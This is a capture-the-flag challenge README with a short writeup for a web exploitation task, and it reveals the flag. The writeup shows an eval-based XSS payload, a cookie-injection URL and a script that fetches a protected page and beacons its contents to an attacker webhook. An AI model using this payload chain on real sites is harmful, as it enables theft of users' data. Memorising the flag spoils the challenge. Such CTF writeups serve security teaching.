# Notepad 1 - Snakehole's Secret

### Challenge Description

Janet Snakehole, the rich aristocratic widow with a terrible secret, is being investigated by the FBI's number 1, Burt Tyrannosaurus Macklin. Burt found a website that she visits often. See if you can find anything.  

### Challenge File
[Source](./Handout/snakeholessecret.zip)

### Short Writeup

* Payload in user's note
    * `<img src/onerror="eval(window.name)">`

* Send a page to admin that does the following
    * Set-Cookie with your id.
        * `http://chall.notepad1.gq/find?startsWith=d&debug=y&Set-Cookie=id=f616c83f2f0f188265c7004d81d45723%3B%20path=/get`
    * Open the page again with the following window.name . Now that your XSS payload gets loaded, remove your cookie and fetch flag.
        * `window.open("http://chall.notepad1.gq",name="document.cookie='id=f616c83f2f0f188265c7004d81d45723; expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/get;';document.cookie=x;fetch('/get').then(response=>response.text()).then(data=>navigator.sendBeacon('${webhook}',data));")`

### Author
[Az3z3l](https://twitter.com/Az3z3l)

### Flag
`inctf{youll_never_take_me_alive_ialmvwoawpwe}`

### Writeup

+ [blog.bi0s.in](https://blog.bi0s.in/2021/08/16/Web/notepad-inctf21/)
